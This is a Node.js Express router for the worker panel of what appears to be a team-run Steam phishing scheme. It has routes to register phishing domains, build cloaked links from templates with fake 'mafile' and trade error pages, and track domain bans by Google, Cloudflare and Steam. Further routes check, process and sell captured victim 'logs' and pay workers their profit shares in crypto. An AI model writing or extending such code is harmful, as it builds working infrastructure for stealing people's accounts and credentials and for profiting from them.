const express = require("express");
const { env } = require("../config/env");
const {
  verifyWorkerTelegramLogin,
  setWorkerSessionCookie,
  clearWorkerSessionCookie,
  requireWorker,
  canAccessWorkerPanel,
} = require("./userAuth");
const { ensureUser, getUserByTelegramId, listCurators, listCallers } = require("../services/userService");
const { serializeMember } = require("./serializers");
const { getCurrencyContext } = require("../services/currencyService");
const { formatDisplayAmount } = require("../services/currencyService");
const {
  listDomains,
  getWorkerDomainDetail,
  previewAddDomain,
  addDomain,
  removeDomain,
  listTemplates,
  createWorkerLink,
  updateWorkerLink,
  deleteWorkerLink,
  listWorkers,
} = require("../services/adminSitesService");
const { listWorkerLogs, listWorkerTasks } = require("../services/workerPanelService");
const { getWorkerOverview } = require("../services/workerDashboardService");
const { getTopWorkers } = require("../services/topService");
const { resolveWorkerPhotoUrl } = require("../utils/profilePhoto");
const {
  createWithdrawalRequest,
  getAvailableUsd,
  methodLabel,
  getNetworkFeeUsd,
  METHOD_LABELS,
  listUserRequests,
} = require("../services/withdrawalService");
const { listUserProfits } = require("../services/profitService");
const { isAdminTelegramId } = require("../services/userService");
const {
  hashAppPassword,
  verifyAppPassword,
  validateNewPassword,
  appLoginOf,
} = require("./appPassword");
const {
  createFeedback,
  listUserFeedback,
  notifyAdminsAboutFeedback,
} = require("../services/feedbackService");
const {
  createCuratorApplication,
  getPendingApplication,
  buildCuratorApplicationNotifyHtml,
  curatorApplicationModerationKeyboard,
} = require("../services/curatorService");
const { serializeCuratorLike } = require("../services/workerTeamService");
const { requestSell, requestProcess, requestCheckValid, getLogDetail, refreshLogDetail } = require("../services/workerLogActionsService");

// Avatar upload is handled via Telegram photos only.

function createUserRouter(bot) {
  const router = express.Router();

  router.get("/config", async (_req, res) => {
    const botId = String(env.botToken || "").split(":")[0] || "";
    const currencyCtx = await getCurrencyContext();
    res.json({
      botUsername: env.botUsername || "",
      botId,
      authDisabled: Boolean(env.panelAuthDisabled),
      supportUrl: env.supportUrl || "",
      manualsDocsUrl: env.manualsDocsUrl || "",
      changelogsUrl: env.changelogsUrl || "",
      aboutInfoChannelUrl: env.aboutInfoChannelUrl || "",
      minWithdrawalUsd: env.walletMinWithdrawalUsd,
      usdRubRate: currencyCtx.rate,
      globalCurrency: currencyCtx.currency,
    });
  });

  router.post("/auth/telegram", async (req, res) => {
    try {
      if (env.panelAuthDisabled) {
        const telegramId = String(env.adminIds[0] || "").trim();
        if (!telegramId) return res.status(500).json({ error: "no_admin_ids" });
        setWorkerSessionCookie(res, telegramId);
        return res.json({ ok: true });
      }

      const result = verifyWorkerTelegramLogin(req.body || {});
      if (!result.ok) {
        return res.status(401).json({ error: result.error });
      }
      const { user: tg } = result;
      let user = await getUserByTelegramId(tg.telegramId);
      if (!user) {
        user = await ensureUser({
          id: tg.telegramId,
          username: tg.username,
          first_name: tg.firstName,
        });
      } else {
        user.username = tg.username || user.username;
        user.firstName = tg.firstName || user.firstName;
        await user.save();
      }

      const nextAvatar = resolveWorkerPhotoUrl(user, { loginPhotoUrl: tg.photoUrl });
      if (nextAvatar && nextAvatar !== user.avatarUrl) {
        user.avatarUrl = nextAvatar;
        await user.save();
      }

      if (!canAccessWorkerPanel(user)) {
        return res.status(403).json({ error: "not_team_member" });
      }

      setWorkerSessionCookie(res, tg.telegramId);
      const currencyCtx = await getCurrencyContext();
      return res.json({
        ok: true,
        user: {
          ...serializeMember(user, currencyCtx),
          photoUrl: resolveWorkerPhotoUrl(user),
          isAdmin: isAdminTelegramId(user.telegramId),
        },
      });
    } catch (error) {
      return res.status(500).json({ error: error.message || "auth_failed" });
    }
  });

  router.post("/auth/logout", (_req, res) => {
    clearWorkerSessionCookie(res);
    res.json({ ok: true });
  });

  router.get("/me", requireWorker, async (req, res) => {
    const currencyCtx = await getCurrencyContext();
    const photoUrl = resolveWorkerPhotoUrl(req.worker);
    if (photoUrl && photoUrl !== req.worker.avatarUrl) {
      req.worker.avatarUrl = photoUrl;
      try {
        await req.worker.save();
      } catch (_) {
        // non-fatal: still return resolved url
      }
    }
    res.json({
      user: {
        ...serializeMember(req.worker, currencyCtx),
        payoutMethod: req.worker.payoutMethod || "",
        payoutAddress: req.worker.payoutAddress || "",
        isAdmin: isAdminTelegramId(req.worker.telegramId),
        photoUrl,
      },
    });
  });

  router.get("/overview", requireWorker, async (req, res) => {
    try {
      const days = Math.min(30, Math.max(1, Number(req.query.days || 7)));
      res.json(await getWorkerOverview(req.worker, { days }));
    } catch (error) {
      res.status(error.status || 500).json({ error: error.message });
    }
  });

  router.get("/logs", requireWorker, async (req, res) => {
    try {
      res.json(
        await listWorkerLogs(req.worker, {
          offset: req.query.offset,
          limit: req.query.limit,
          q: req.query.q,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/tasks", requireWorker, async (req, res) => {
    try {
      res.json(await listWorkerTasks(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/top", requireWorker, async (req, res) => {
    try {
      const period = ["all", "24h", "7d", "30d"].includes(String(req.query.period || ""))
        ? String(req.query.period)
        : "7d";
      const limit = Math.min(30, Math.max(5, Number(req.query.limit || 10)));
      const rows = await getTopWorkers(period, limit);
      const me = String(req.worker.telegramId || "");
      res.json({
        period,
        rows: rows.map((row, index) => ({
          rank: index + 1,
          telegramId: row.isAnonymous ? "" : row.telegramId || "",
          displayName: row.isAnonymous
            ? "Аноним"
            : row.firstName || row.username || (row.telegramId ? `ID ${row.telegramId}` : "—"),
          username: row.isAnonymous ? "" : row.username || "",
          isAnonymous: Boolean(row.isAnonymous),
          isMe: !row.isAnonymous && me && String(row.telegramId) === me,
          totalUsd: Number(row.total || 0),
          count: Number(row.count || 0),
        })),
      });
    } catch (error) {
      res.status(error.status || 500).json({ error: error.message });
    }
  });

  router.get("/alerts", requireWorker, async (req, res) => {
    try {
      const payload = await listDomains(req.worker, { light: true });
      const domains = payload?.domains || [];
      const alerts = [];
      for (const domain of domains) {
        const domainName = String(domain.domain || domain.id || "domain");
        if (domain.isPaused) {
          alerts.push({
            id: `paused:${domain.id}`,
            type: "paused",
            severity: "warn",
            title: domainName,
            message: "Домен на паузе — ссылки не работают",
            domainId: domain.id,
            createdAt: domain.updatedAt || domain.createdAt || null,
          });
        }
        const checks = domain.banChecks || {};
        for (const key of ["google", "cloudflare", "whois", "yandex", "steam"]) {
          if (checks[key]?.banned) {
            alerts.push({
              id: `ban:${domain.id}:${key}`,
              type: "ban",
              severity: "danger",
              title: domainName,
              message: `Бан: ${key}`,
              domainId: domain.id,
              banType: key,
              createdAt: checks.updatedAt || domain.updatedAt || null,
            });
          }
        }
      }
      alerts.sort((a, b) => {
        const severityRank = { danger: 0, warn: 1, info: 2 };
        const sa = severityRank[a.severity] ?? 9;
        const sb = severityRank[b.severity] ?? 9;
        if (sa !== sb) return sa - sb;
        return String(b.createdAt || "").localeCompare(String(a.createdAt || ""));
      });
      res.json({ alerts, count: alerts.length });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains", requireWorker, async (req, res) => {
    try {
      const includeLinks =
        req.query.includeLinks === "1" ||
        req.query.includeLinks === "true" ||
        req.query.includeLinks === "yes";
      res.json(await listDomains(req.worker, { includeLinks }));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains/:id", requireWorker, async (req, res) => {
    try {
      res.json(await getWorkerDomainDetail(req.worker, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/domains/check", requireWorker, async (req, res) => {
    try {
      res.json(await previewAddDomain(req.worker, req.body?.domain));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/domains", requireWorker, async (req, res) => {
    try {
      res.json(await addDomain(req.worker, req.body?.domain));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/sites/domains/:id", requireWorker, async (req, res) => {
    try {
      res.json(await removeDomain(req.worker, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/templates", requireWorker, async (req, res) => {
    try {
      res.json(await listTemplates(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/domains/:id/links", requireWorker, async (req, res) => {
    try {
      res.json(
        await createWorkerLink(req.worker, req.params.id, {
          path: req.body?.path,
          templateId: req.body?.templateId,
          windowType: req.body?.windowType,
          iframe: req.body?.iframe,
          cloaking: req.body?.cloaking,
          ban_vpn: req.body?.ban_vpn,
          randPath: req.body?.randPath,
          logError: req.body?.logError,
          mafileError: req.body?.mafileError,
          mafileSteamRedirect: req.body?.mafileSteamRedirect,
          tradeError: req.body?.tradeError,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.patch("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
    try {
      res.json(
        await updateWorkerLink(req.worker, req.params.domainId, req.params.linkId, {
          path: req.body?.path,
          templateId: req.body?.templateId,
          windowType: req.body?.windowType,
          iframe: req.body?.iframe,
          cloaking: req.body?.cloaking,
          logError: req.body?.logError,
          mafileError: req.body?.mafileError,
          mafileSteamRedirect: req.body?.mafileSteamRedirect,
          tradeError: req.body?.tradeError,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
    try {
      res.json(await deleteWorkerLink(req.worker, req.params.domainId, req.params.linkId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/team/workers", requireWorker, async (req, res) => {
    try {
      res.json(await listWorkers(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/settings", requireWorker, async (req, res) => {
    const currencyCtx = await getCurrencyContext();
    const methods = Object.keys(METHOD_LABELS || {}).map((key) => ({
      id: key,
      label: methodLabel(key),
      feeUsd: getNetworkFeeUsd(key),
    }));
    res.json({
      user: {
        ...serializeMember(req.worker, currencyCtx),
        photoUrl: resolveWorkerPhotoUrl(req.worker),
        payoutMethod: req.worker.payoutMethod || "",
        payoutAddress: req.worker.payoutAddress || "",
        appLogin: appLoginOf(req.worker),
        hasAppPassword: Boolean(req.worker.appPasswordHash),
      },
      methods,
      minWithdrawalUsd: env.walletMinWithdrawalUsd,
      supportUrl: env.supportUrl || "",
    });
  });

  router.post("/settings/password", requireWorker, async (req, res) => {
    try {
      const current = String(req.body?.currentPassword || "");
      const next = String(req.body?.newPassword || "");
      const confirm = String(req.body?.confirmPassword || "");
      const hasPassword = Boolean(req.worker.appPasswordHash);

      if (next !== confirm) {
        return res.status(400).json({ error: "Пароли не совпадают" });
      }
      const check = validateNewPassword(next);
      if (!check.ok) {
        return res.status(400).json({ error: check.error });
      }
      if (hasPassword) {
        if (!current) {
          return res.status(400).json({ error: "Введите текущий пароль" });
        }
        if (!verifyAppPassword(current, req.worker.appPasswordHash)) {
          return res.status(400).json({ error: "Неверный текущий пароль" });
        }
        if (current === next) {
          return res.status(400).json({ error: "Новый пароль должен отличаться от текущего" });
        }
      }

      req.worker.appPasswordHash = hashAppPassword(next);
      await req.worker.save();
      return res.json({ ok: true, hasAppPassword: true });
    } catch (error) {
      return res.status(400).json({ error: error.message || "password_change_failed" });
    }
  });

  router.patch("/settings", requireWorker, async (req, res) => {
    try {
      const method = String(req.body?.payoutMethod || "").trim();
      const address = String(req.body?.payoutAddress || "").trim();
      if (method && !METHOD_LABELS[method]) {
        return res.status(400).json({ error: "Неизвестный метод выплат" });
      }
      req.worker.payoutMethod = method;
      req.worker.payoutAddress = address;
      if (req.body?.isAnonymous != null) {
        req.worker.isAnonymous = Boolean(req.body.isAnonymous);
      }
      if (req.body?.bio != null) {
        req.worker.bio = String(req.body.bio || "").slice(0, 500);
      }
      await req.worker.save();
      const currencyCtx = await getCurrencyContext();
      res.json({
        ok: true,
        user: {
          ...serializeMember(req.worker, currencyCtx),
          photoUrl: resolveWorkerPhotoUrl(req.worker),
          payoutMethod: req.worker.payoutMethod || "",
          payoutAddress: req.worker.payoutAddress || "",
        },
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/wallet/withdraw", requireWorker, async (req, res) => {
    try {
      const amount = Number(req.body?.amount);
      const method = String(req.body?.method || req.worker.payoutMethod || "").trim();
      const address = String(req.body?.address || req.worker.payoutAddress || "").trim();
      const created = await createWithdrawalRequest(req.worker, amount, method, address);
      res.json({ ok: true, request: created });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/wallet", requireWorker, async (req, res) => {
    try {
      const currencyCtx = await getCurrencyContext();
      const methods = Object.keys(METHOD_LABELS || {}).map((key) => ({
        id: key,
        label: methodLabel(key),
        feeUsd: getNetworkFeeUsd(key),
      }));

      const walletUsd = Number(req.worker.totalProfit || 0);
      const availableUsd = Number(await getAvailableUsd(req.worker));
      const availableDisplay = formatDisplayAmount(availableUsd, currencyCtx);

      res.json({
        user: {
          ...serializeMember(req.worker, currencyCtx),
          photoUrl: resolveWorkerPhotoUrl(req.worker),
          payoutMethod: req.worker.payoutMethod || "",
          payoutAddress: req.worker.payoutAddress || "",
        },
        walletUsd,
        availableUsd,
        availableDisplay,
        minWithdrawalUsd: env.walletMinWithdrawalUsd,
        methods,
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/wallet/history", requireWorker, async (req, res) => {
    try {
      const tab = String(req.query.tab || "profits").trim();
      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));

      if (tab === "profits") {
        const rows = await listUserProfits(req.worker, limit);
        return res.json({
          tab,
          items: (rows || []).map((p) => ({
            id: String(p._id || ""),
            createdAt: p.createdAt || null,
            amountUsd: Number(p.workerShare || 0),
            // статус у профитов не хранится отдельным полем — это "событие профита".
            type: "profit",
          })),
        });
      }

      if (tab === "withdrawals") {
        const rows = await listUserRequests(req.worker.telegramId, limit);
        return res.json({
          tab,
          items: (rows || []).map((r) => ({
            id: String(r._id || ""),
            createdAt: r.createdAt || null,
            amountUsd: Number(r.amountUsd || 0),
            method: r.method || "",
            walletAddress: r.walletAddress || "",
            status: r.status || "pending",
            payoutUrl: r.payoutUrl || "",
            type: "withdrawal",
          })),
        });
      }

      return res.status(400).json({ error: "unknown_history_tab" });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/team/curators", requireWorker, async (_req, res) => {
    try {
      const curators = await listCurators();
      return res.json({
        roleType: "curator",
        members: (curators || []).map((u) => serializeCuratorLike(u, { roleType: "curator" })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/team/callers", requireWorker, async (_req, res) => {
    try {
      const callers = await listCallers();
      return res.json({
        roleType: "caller",
        members: (callers || []).map((u) => serializeCuratorLike(u, { roleType: "caller" })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/team/curators/:telegramId/apply", requireWorker, async (req, res) => {
    try {
      const curatorTelegramId = String(req.params.telegramId || "").trim();
      if (!curatorTelegramId) return res.status(400).json({ error: "curator_id_required" });

      const curator = await getUserByTelegramId(curatorTelegramId);
      if (!curator?.isCurator) return res.status(400).json({ error: "curator_not_found" });

      // createCuratorApplication() сам валидирует дубликаты и привязки.
      const application = await createCuratorApplication(req.worker, curator);

      if (bot?.telegram?.sendMessage) {
        try {
          await bot.telegram.sendMessage(
            curator.telegramId,
            buildCuratorApplicationNotifyHtml(req.worker),
            {
              parse_mode: "HTML",
              reply_markup: curatorApplicationModerationKeyboard(application._id.toString()).reply_markup,
            }
          );
        } catch (e) {
          // Уведомление куратору вторично — заявку всё равно создаём.
        }
      }

      return res.json({ ok: true, applicationId: String(application._id) });
    } catch (error) {
      return res.status(400).json({ error: error.message || "curator_apply_failed" });
    }
  });

  router.get("/feedback", requireWorker, async (req, res) => {
    try {
      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));
      const rows = await listUserFeedback(req.worker.telegramId, limit);
      return res.json({
        items: (rows || []).map((t) => ({
          id: String(t._id || ""),
          type: t.type || "",
          text: String(t.text || ""),
          status: t.status || "open",
          adminReply: String(t.adminReply || ""),
          createdAt: t.createdAt || null,
        })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/feedback", requireWorker, async (req, res) => {
    try {
      const type = String(req.body?.type || "").trim();
      const text = String(req.body?.text || "").trim();
      const ticket = await createFeedback(req.worker, { type, text });

      if (bot?.telegram) {
        await notifyAdminsAboutFeedback(bot.telegram, ticket);
      }

      return res.json({ ok: true, ticketId: String(ticket._id) });
    } catch (error) {
      return res.status(400).json({ error: error.message || "feedback_failed" });
    }
  });

  router.get("/logs/:sourceId", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await getLogDetail(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/check-valid", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await requestCheckValid(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/refresh", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await refreshLogDetail(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/sell", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      const log = await requestSell({ telegram: bot.telegram }, req.worker, sourceId);
      return res.json({
        ok: true,
        saleStatus: log.saleStatus || "none",
      });
    } catch (error) {
      return res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/process", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      const log = await requestProcess({ telegram: bot.telegram }, req.worker, sourceId);
      return res.json({
        ok: true,
        processStatus: log.processStatus || "none",
      });
    } catch (error) {
      return res.status(error.status || 400).json({ error: error.message });
    }
  });

  return router;
}

module.exports = { createUserRouter };
